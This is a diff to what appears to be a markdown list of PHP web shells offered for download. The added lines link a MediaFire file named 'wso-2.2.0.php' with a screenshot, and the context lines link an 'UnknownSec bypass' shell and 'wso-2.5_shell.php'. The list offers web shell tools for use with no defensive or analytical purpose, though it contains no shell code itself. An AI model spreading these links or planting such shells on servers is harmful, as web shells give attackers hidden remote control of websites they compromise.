@@ -126,6 +126,9 @@ Date : 10 January 2023
 # <a href="https://www.mediafire.com/file/z8kstuh2csr7sop/UnknownSec-bypass_shell.php/file">UnknownSec Bypass</a>
 <img src="https://imgur.com/62InxIn.png" alt="beruangsalju profile">
   
+# <a href="https://www.mediafire.com/file/ya2dmm7lb55ud9k/wso-2.2.0.php/file">WS0-2.2.0</a>
+<img src="https://i.imgur.com/VITznl8.png" alt="beruangsalju profile">
+  
 # <a href="https://www.mediafire.com/file/2qnv79b3wf7nv56/wso-2.5_shell.php/file">WSO-2.5</a>
 <img src="https://imgur.com/ock8yH5.png" alt="beruangsalju profile">
   
